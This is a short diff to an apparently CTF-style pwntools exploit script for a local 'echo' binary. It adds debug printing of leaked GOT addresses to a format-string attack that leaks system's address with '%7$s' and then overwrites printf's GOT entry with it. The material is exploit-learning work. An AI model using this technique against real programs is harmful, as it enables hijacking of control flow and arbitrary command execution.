@@ -14,6 +14,10 @@ io = process("./echo")
 payload = p32(system_got) + "%7$s"
 io.sendline(payload)
 system_addr = u32(io.recv(8)[4: 8])
+success("system_addr -> 0x%x" % system_addr)#system_addr is virtual address or physical address?
+success("system_got -> 0x%x" % system_got)
+success("printf_got -> 0x%x" % printf_got)
+
 
 #hijack system to printf_got
 payload = fmtstr_payload(7, {printf_got: system_addr})
